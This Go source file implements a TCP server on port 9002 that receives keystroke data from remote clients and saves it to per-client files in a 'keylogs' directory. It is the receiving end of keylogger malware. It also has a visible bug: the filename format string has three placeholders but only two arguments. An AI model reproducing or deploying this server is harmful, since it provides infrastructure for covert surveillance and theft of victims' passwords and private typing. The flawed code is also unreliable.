package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
)

func handleClient(conn net.Conn) {
	defer conn.Close()

	addr := conn.RemoteAddr().(*net.TCPAddr)
	hostname, err := net.LookupAddr(addr.IP.String())
	if err != nil || len(hostname) == 0 {
		hostname = []string{"UnknownHost"}
	}

	// Ensure the keylogs directory exists
	logDir := "keylogs"
	if err := os.MkdirAll(logDir, 0755); err != nil {
		fmt.Println("Error creating directory:", err)
		return
	}

	// Generate a unique filename for each client based on their IP and hostname
	logFilename := fmt.Sprintf("%s_keylog_%s_%s.txt", addr.IP.String(), hostname[0])
	logFilename = strings.ReplaceAll(logFilename, ":", "_")
	logFilename = strings.ReplaceAll(logFilename, ".", "_")
	fullPath := filepath.Join(logDir, logFilename)

	logfile, err := os.OpenFile(fullPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer logfile.Close()

	reader := bufio.NewReader(conn)
	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			fmt.Printf("Client %s disconnected\n", addr.IP.String())
			break
		}
		message = strings.TrimRight(message, "\r\n")

		// Write the received data to the log file
		logfile.WriteString(message)
		logfile.Sync()

		// Print each character received to the console
		fmt.Printf("Received from %s: %s\n", addr.IP.String(), message)
	}
}

func startServer(host string, port string) {
	l, err := net.Listen("tcp", host+":"+port)
	if err != nil {
		fmt.Println("Error listening:", err)
		os.Exit(1)
	}
	defer l.Close()
	fmt.Printf("Server listening on %s:%s\n", host, port)

	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
		go handleClient(conn)
	}
}

func main() {
	startServer("0.0.0.0", "9002")
}
